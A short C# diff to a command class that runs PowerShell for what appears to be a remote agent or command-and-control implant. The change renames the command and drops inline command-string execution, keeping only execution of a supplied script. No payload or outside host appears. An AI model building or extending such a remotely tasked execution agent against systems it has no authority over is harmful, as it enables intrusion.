@@ -9,18 +9,13 @@ namespace Agent.Commands
 {
     public class RunPowershell : AgentCommand
     {
-        public override string Name => "run-powershell";
+        public override string Name => "run-pwsh-script";
 
         public override string Execute(AgentTask task)
         {
             if (task.FileBytes is null)
             {
-                if (task.Args is null || task.Args.Length == 0)
-                {
-                    return "No Powershell command string or script provided.";
-                }
-                var args = string.Join(" ", task.Args);
-                return Internal.Execute.ExecutePowershellCommand(args);
+                return "No Powershell script provided.";
             } else
             {
                 return Internal.Execute.ExecutePowershellScript(task.FileBytes);
